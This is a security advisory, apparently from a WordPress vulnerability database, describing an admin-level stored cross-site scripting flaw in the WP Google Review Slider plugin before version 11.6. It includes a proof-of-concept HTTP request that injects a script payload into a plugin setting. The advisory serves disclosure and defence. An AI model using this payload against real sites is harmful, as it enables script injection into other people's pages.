## WordPress Plugin Vulnerabilities

# WP Google Review Slider < 11.6 - Admin+ Stored XSS

### Description

The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered\_html capability is disallowed (for example in multisite setup).

### Proof of Concept

POST /wp-admin/admin-ajax.php?\_fs\_blog\_admin=true HTTP/1.1
Host: example.com
X-Requested-With: XMLHttpRequest
Referer: http://example.com/wp-admin/admin.php?page=wp\_google-googlecrawl
Cookie: [admin+]
Connection: close
action=wpfbr\_crawl\_placeid&gplaceid="><script>alert(/xss/);</script><"&\_ajax\_nonce=<nonce key>
